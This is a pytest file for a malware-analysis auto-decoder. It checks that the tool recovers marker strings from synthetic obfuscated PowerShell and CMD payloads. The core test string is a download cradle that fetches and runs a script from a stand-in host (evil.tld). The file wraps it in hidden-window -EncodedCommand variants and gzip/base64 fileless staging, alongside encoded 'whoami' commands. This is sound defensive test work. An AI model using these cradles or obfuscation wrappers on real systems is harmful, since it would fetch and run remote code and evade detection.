"""Regression matrix for NivX Forge auto-decoder.

Covers the real-world PowerShell / CMD / obfuscation patterns an analyst
routinely encounters. Each test asserts that `auto_decode()` recovers a
meaningful marker string from a synthetic payload built with the same
techniques used by actual malware families.
"""
from __future__ import annotations

import base64
import gzip

import pytest

import cyberlab.plugins  # noqa: F401 — registers all plugins
from cyberlab.engine import auto_decode


INNER = "IEX (New-Object Net.WebClient).DownloadString('http://evil.tld/a.ps1')"


def _b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-16le")).decode()


# ---------------------------------------------------------------------------
# PowerShell -EncodedCommand (many flag spellings)
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("cmdline", [
    f"powershell.exe -enc {_b64(INNER)}",
    f"powershell -w hidden -e {_b64(INNER)}",
    f"PowerShell.exe -NoProfile -EncodedCommand {_b64(INNER)}",
    f"PoWeRsHeLl -EC {_b64(INNER)}",
    f"pwsh -NoLogo -encodedcommand {_b64(INNER)}",
])
def test_powershell_encoded_variants(cmdline):
    out, trace = auto_decode(cmdline, max_depth=6)
    text = out.decode("utf-8", errors="replace")
    assert "DownloadString" in text, (
        f"failed to decode PS -enc variant.\n"
        f"trace: {[s.id for s in trace]}\nfinal: {text[:200]!r}"
    )


# ---------------------------------------------------------------------------
# Nested: PS -enc → gzip-wrapped payload (fileless staging)
# ---------------------------------------------------------------------------
def test_powershell_enc_wrapping_gzip_fromb64():
    gz_b64 = base64.b64encode(gzip.compress(INNER.encode("utf-16le"))).decode()
    wrapper = (
        '$s=[IO.MemoryStream][Convert]::FromBase64String("' + gz_b64 + '");'
        'IEX ([IO.StreamReader]::new(New-Object IO.Compression.GzipStream'
        '($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()'
    )
    outer = base64.b64encode(wrapper.encode("utf-16le")).decode()
    out, trace = auto_decode(f"powershell -enc {outer}", max_depth=10)
    text = out.decode("utf-8", errors="replace")
    step_ids = [s.id for s in trace]
    assert "DownloadString" in text, f"trace={step_ids} final={text[:200]!r}"
    # Must have chained through the inline FromBase64String extractor.
    assert "extract-fromb64string" in step_ids


# ---------------------------------------------------------------------------
# Inline [Convert]::FromBase64String("...") / [System.Convert]::…
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("script", [
    '$x=[Convert]::FromBase64String("' + base64.b64encode(b"cmd /c whoami").decode() + '")',
    '[System.Convert]::FromBase64String("' + _b64(INNER) + '")',
    'FromBase64String("' + base64.b64encode(b"cmd /c whoami").decode() + '")',
])
def test_inline_fromb64_extractor(script):
    out, trace = auto_decode(script, max_depth=6)
    text = out.decode("utf-8", errors="replace")
    step_ids = [s.id for s in trace]
    assert "extract-fromb64string" in step_ids
    assert ("whoami" in text.lower()) or ("downloadstring" in text.lower()), (
        f"trace={step_ids} final={text[:200]!r}"
    )


# ---------------------------------------------------------------------------
# Single-layer encodings
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("payload,expect,step_id", [
    (base64.b64encode(b"cmd /c whoami").decode(), "whoami", "base64-decode"),
    ("cmd%20%2Fc%20whoami", "whoami", "url-decode"),
    ("636d64202f632077686f616d69", "whoami", "hex-decode"),
    ("&#99;&#109;&#100;&#32;/c&#32;whoami", "whoami", "html-entity-decode"),
    ("String.fromCharCode(99,109,100,32,47,99,32,119,104,111,97,109,105)",
     "whoami", "js-deobfuscate"),
    (r"cmd \u0077\u0068\u006f\u0061\u006d\u0069", "whoami", "unicode-escape-decode"),
])
def test_single_layer_decoders(payload, expect, step_id):
    out, trace = auto_decode(payload, max_depth=4)
    text = out.decode("utf-8", errors="replace")
    step_ids = [s.id for s in trace]
    assert step_id in step_ids, f"expected {step_id} in trace {step_ids}"
    assert expect.lower() in text.lower(), f"final={text[:200]!r}"


# ---------------------------------------------------------------------------
# Multi-layer: URL-encoded prefix + base64 body
# ---------------------------------------------------------------------------
def test_url_prefix_then_base64():
    inner = base64.b64encode(b"powershell -c Get-Process").decode()
    payload = f"payload%3D{inner}"
    out, trace = auto_decode(payload, max_depth=6)
    text = out.decode("utf-8", errors="replace")
    step_ids = [s.id for s in trace]
    assert "Get-Process" in text, f"trace={step_ids} final={text[:200]!r}"
    assert "url-decode" in step_ids and "base64-decode" in step_ids


# ---------------------------------------------------------------------------
# Robustness: empty and tiny inputs must not crash or falsely decode.
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("payload", ["", "abc", "hello world", "   "])
def test_no_false_positives_on_plain_text(payload):
    out, trace = auto_decode(payload, max_depth=4)
    # These inputs must NOT trigger any decoder — the auto-decoder should
    # bail immediately since no plugin scores above 0.7.
    assert trace == [], f"unexpected decoding on {payload!r}: {[s.id for s in trace]}"
    assert out.decode("utf-8", errors="replace") == payload
